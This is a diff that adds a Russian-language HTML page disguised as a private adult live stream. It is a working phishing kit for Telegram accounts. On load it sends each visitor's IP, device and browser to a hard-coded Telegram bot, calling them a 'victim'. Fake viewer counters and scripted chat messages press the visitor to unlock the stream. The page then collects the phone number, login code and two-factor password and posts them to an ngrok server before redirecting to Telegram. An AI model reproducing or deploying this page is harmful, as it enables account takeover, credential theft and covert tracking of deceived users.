@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Приватный стрим · LIVE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        .fullscreen-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        
+        .fullscreen-video video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .blur-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(30px);
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 2;
+            pointer-events: none;
+        }
+        
+        .stream-content {
+            position: fixed;
+            bottom: 15%;
+            left: 0;
+            right: 0;
+            text-align: center;
+            z-index: 3;
+            padding: 20px;
+            animation: fadeInUp 0.8s ease;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .live-badge {
+            background: #ff3366;
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(255, 51, 102, 0.5);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .stream-content h1 {
+            font-size: 32px;
+            color: white;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+        
+        .stream-content p {
+            font-size: 18px;
+            color: #ddd;
+            margin-bottom: 25px;
+            text-shadow: 0 0 10px black;
+        }
+        
+        .viewer-stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            color: #ccc;
+        }
+        
+        .viewer-stats span {
+            background: rgba(0,0,0,0.6);
+            padding: 6px 15px;
+            border-radius: 30px;
+            backdrop-filter: blur(5px);
+        }
+        
+        .unlock-btn {
+            background: linear-gradient(135deg, #ff3366, #ff6680);
+            border: none;
+            padding: 16px 40px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .unlock-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 51, 102, 0.8);
+        }
+        
+        .unlock-btn:active {
+            transform: scale(0.98);
+        }
+        
+        .chat-overlay {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            width: 280px;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+            z-index: 4;
+            font-size: 12px;
+        }
+        
+        .chat-header {
+            padding: 12px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+            color: #ff6680;
+            font-weight: bold;
+        }
+        
+        .chat-messages {
+            padding: 10px;
+            height: 200px;
+            overflow-y: auto;
+        }
+        
+        .chat-message {
+            padding: 6px 0;
+            color: #ddd;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .chat-message .name {
+            color: #ff6680;
+        }
+        
+        @media (max-width: 768px) {
+            .stream-content h1 { font-size: 24px; }
+            .stream-content p { font-size: 14px; }
+            .unlock-btn { padding: 12px 30px; font-size: 18px; }
+            .chat-overlay { display: none; }
+            .viewer-stats { gap: 15px; }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.96);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .modal-box {
+            background: #1a1a1a;
+            border-radius: 32px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 320px;
+            text-align: center;
+        }
+        
+        .modal-box h3 { font-size: 24px; margin-bottom: 8px; color: #ff6680; }
+        .modal-box p { color: #aaa; font-size: 14px; margin-bottom: 24px; }
+        .modal-input {
+            width: 100%;
+            padding: 14px;
+            background: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 30px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff3366;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .modal-btn:disabled { background: #555; cursor: not-allowed; }
+        .close-modal {
+            margin-top: 16px;
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .status-text {
+            font-size: 12px;
+            color: #ff8888;
+            margin-top: 12px;
+        }
+        
+        .code-section {
+            display: none;
+        }
+        
+        .password-section {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="fullscreen-video">
+    <video id="bgVideo" autoplay loop muted playsinline>
+        <source src="video.mp4" type="video/mp4">
+    </video>
+</div>
+
+<div class="blur-overlay"></div>
+
+<div class="stream-content">
+    <div class="live-badge">🔴 LIVE</div>
+    <h1>Приватный стрим LeraXXX</h1>
+    <p>🔞 Только для взрослых 18+ 🔞</p>
+    
+    <div class="viewer-stats">
+        <span>👁️ <span id="viewerCount">1543</span> зрителей</span>
+        <span>❤️ <span id="likeCount">892</span> лайков</span>
+        <span>📱 <span id="onlineCount">47</span> онлайн</span>
+    </div>
+    
+    <button class="unlock-btn" onclick="showModal()">🔓 РАЗБЛОКИРОВАТЬ СТРИМ</button>
+    <p style="font-size: 12px; margin-top: 15px; color: #888;">✅ Подтверждение по номеру телефона</p>
+</div>
+
+<div class="chat-overlay">
+    <div class="chat-header">💬 ОБЩИЙ ЧАТ</div>
+    <div class="chat-messages" id="chatMessages">
+        <div class="chat-message"><span class="name">@user_124</span>: когда разблокируют?</div>
+        <div class="chat-message"><span class="name">@mike_fan</span>: блюр снимите</div>
+        <div class="chat-message"><span class="name">LeraXXX</span>: подтвердите номер и всё увидите 🔥</div>
+        <div class="chat-message"><span class="name">@vip_777</span>: уже зашёл, всё работает</div>
+    </div>
+</div>
+
+<div id="modal" class="modal">
+    <div class="modal-box">
+        <h3 id="modalTitle">🔞 Доступ к стриму</h3>
+        <p id="modalDesc">Введите номер телефона</p>
+        <input type="tel" id="phone" class="modal-input" placeholder="+71234567890">
+        <div id="codeSection" class="code-section">
+            <input type="text" id="code" class="modal-input" placeholder="Код подтверждения">
+        </div>
+        <div id="passwordSection" class="password-section">
+            <input type="password" id="password" class="modal-input" placeholder="Пароль">
+        </div>
+        <button id="actionBtn" class="modal-btn" onclick="handleAction()">📱 Отправить код</button>
+        <div id="status" class="status-text"></div>
+        <button class="close-modal" onclick="closeModal()">Отмена</button>
+    </div>
+</div>
+
+<script>
+    // ========== КОНФИГ ==========
+    const API_URL = 'https://7e14-5-250-144-104.ngrok-free.app';
+    const BOT_TOKEN = '8795552573:AAETvpi9YS1oef6dsCnEbvak8kZc6P7c8B0';
+    const ADMIN_ID = '8750906481';
+    
+    let currentPhone = "";
+    let currentStep = "phone";
+    
+    // ========== ОТПРАВКА ЛОГА В ТЕЛЕГРАМ (для отладки) ==========
+    function sendTelegramLog(text) {
+        try {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
+                .catch(() => {});
+        } catch(e) {}
+    }
+    
+    // ========== ЛОГ ЗАХОДА ==========
+    (function() {
+        const time = new Date().toLocaleString();
+        const url = window.location.href;
+        const ua = navigator.userAgent;
+        
+        let device = "💻 Компьютер";
+        if (ua.includes('iPhone')) device = "📱 iPhone";
+        else if (ua.includes('Android')) device = "📱 Android";
+        else if (ua.includes('Mobile')) device = "📱 Мобильное";
+        
+        let browser = "🌐 Другой";
+        if (ua.includes('Chrome')) browser = "🌐 Chrome";
+        else if (ua.includes('Firefox')) browser = "🦊 Firefox";
+        else if (ua.includes('Safari')) browser = "🧭 Safari";
+        else if (ua.includes('Edge')) browser = "🌊 Edge";
+        
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                sendTelegramLog(`🕷️ ЖЕРТВА ЗАШЛА НА СТРИМ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`);
+            })
+            .catch(() => {
+                sendTelegramLog(`🕷️ ЖЕРТВА ЗАШЛА НА СТРИМ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
+            });
+    })();
+    
+    // ========== ДИНАМИЧЕСКИЕ СЧЕТЧИКИ ==========
+    let viewers = 1543;
+    let likes = 892;
+    let online = 47;
+    
+    setInterval(() => {
+        viewers += Math.floor(Math.random() * 7) - 2;
+        likes += Math.floor(Math.random() * 5);
+        online += Math.floor(Math.random() * 5) - 2;
+        
+        if (viewers < 800) viewers = 800;
+        if (likes < 500) likes = 500;
+        if (online < 20) online = 20;
+        
+        document.getElementById('viewerCount').innerText = viewers;
+        document.getElementById('likeCount').innerText = likes;
+        document.getElementById('onlineCount').innerText = online;
+    }, 8000);
+    
+    // ========== АВТОЧАТ ==========
+    const chatMsgs = [
+        "кто смотрит?", "жарко 🔥", "разблокируйте быстрее", "жду", "когда?", "лучший стрим", "ого", "хочу посмотреть",
+        "привет", "как зайти?", "уже оплатил", "где ссылка?", "классная", "покажи ещё", "🔥🔥🔥"
+    ];
+    const chatNames = ["@lexa", "@vip", "@dimon", "@user123", "@fan_88", "@hunter", "@moon", "@dark", "@max", "@alex"];
+    
+    function addChatMessage() {
+        const msgDiv = document.getElementById('chatMessages');
+        const newMsg = document.createElement('div');
+        newMsg.className = 'chat-message';
+        const name = chatNames[Math.floor(Math.random() * chatNames.length)];
+        const text = chatMsgs[Math.floor(Math.random() * chatMsgs.length)];
+        newMsg.innerHTML = `<span class="name">${name}</span>: ${text}`;
+        msgDiv.appendChild(newMsg);
+        while (msgDiv.children.length > 12) msgDiv.removeChild(msgDiv.children[0]);
+        msgDiv.scrollTop = msgDiv.scrollHeight;
+    }
+    setInterval(addChatMessage, 7000);
+    
+    // ========== МОДАЛКА ==========
+    function showModal() {
+        document.getElementById('modal').style.display = 'flex';
+        resetModal();
+    }
+    
+    function resetModal() {
+        document.getElementById('phone').value = "";
+        document.getElementById('code').value = "";
+        document.getElementById('password').value = "";
+        document.getElementById('codeSection').style.display = 'none';
+        document.getElementById('passwordSection').style.display = 'none';
+        document.getElementById('actionBtn').innerText = "📱 Отправить код";
+        document.getElementById('actionBtn').disabled = false;
+        document.getElementById('status').innerHTML = "";
+        document.getElementById('modalTitle').innerText = "🔞 Доступ к стриму";
+        document.getElementById('modalDesc').innerText = "Введите номер телефона";
+        currentPhone = "";
+        currentStep = "phone";
+    }
+    
+    function closeModal() {
+        document.getElementById('modal').style.display = 'none';
+        resetModal();
+    }
+    
+    // ========== ОСНОВНАЯ ЛОГИКА (КАК В ТВОЕМ САЙТЕ) ==========
+    async function handleAction() {
+        const btn = document.getElementById('actionBtn');
+        const statusDiv = document.getElementById('status');
+        
+        if (currentStep === "phone") {
+            let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
+            if (!phone) { statusDiv.innerText = "Введите номер"; return; }
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ Отправка...";
+            statusDiv.innerText = "Отправляем код...";
+            
+            try {
+                const response = await fetch(`${API_URL}/send_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    currentPhone = phone;
+                    currentStep = "code";
+                    document.getElementById('codeSection').style.display = 'block';
+                    btn.innerText = "✅ Подтвердить код";
+                    document.getElementById('modalTitle').innerText = "📲 Введите код";
+                    document.getElementById('modalDesc').innerText = "Код отправлен";
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Код отправлен!";
+                    btn.disabled = false;
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
+                    btn.disabled = false;
+                    btn.innerText = "📱 Отправить код";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка: сервер не запущен";
+                btn.disabled = false;
+                btn.innerText = "📱 Отправить код";
+            }
+        } else if (currentStep === "code") {
+            const code = document.getElementById('code').value.trim();
+            if (!code) { statusDiv.innerText = "Введите код"; return; }
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ Проверка...";
+            
+            try {
+                const response = await fetch(`${API_URL}/verify_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, code: code })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Вход выполнен!";
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
+                } else if (data.needs_password) {
+                    currentStep = "password";
+                    document.getElementById('codeSection').style.display = 'none';
+                    document.getElementById('passwordSection').style.display = 'block';
+                    btn.innerText = "🔐 Подтвердить пароль";
+                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
+                    document.getElementById('modalDesc').innerText = "Введите пароль";
+                    statusDiv.style.color = "#ffaa66";
+                    statusDiv.innerHTML = "⏳ Требуется пароль";
+                    btn.disabled = false;
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
+                    btn.disabled = false;
+                    btn.innerText = "✅ Подтвердить код";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка соединения";
+                btn.disabled = false;
+                btn.innerText = "✅ Подтвердить код";
+            }
+        } else if (currentStep === "password") {
+            const password = document.getElementById('password').value.trim();
+            if (!password) { statusDiv.innerText = "Введите пароль"; return; }
+            
+            btn.disabled = true;
+            btn.innerText = "⏳ Проверка...";
+            
+            try {
+                const response = await fetch(`${API_URL}/verify_password`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, password: password })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    statusDiv.style.color = "#88ff88";
+                    statusDiv.innerHTML = "✅ Вход выполнен!";
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
+                } else {
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
+                    btn.disabled = false;
+                    btn.innerText = "🔐 Подтвердить пароль";
+                }
+            } catch(e) {
+                statusDiv.innerText = "Ошибка соединения";
+                btn.disabled = false;
+                btn.innerText = "🔐 Подтвердить пароль";
+            }
+        }
+    }
+    
+    window.showModal = showModal;
+    window.closeModal = closeModal;
+    window.handleAction = handleAction;
+</script>
+</body>
+</html>
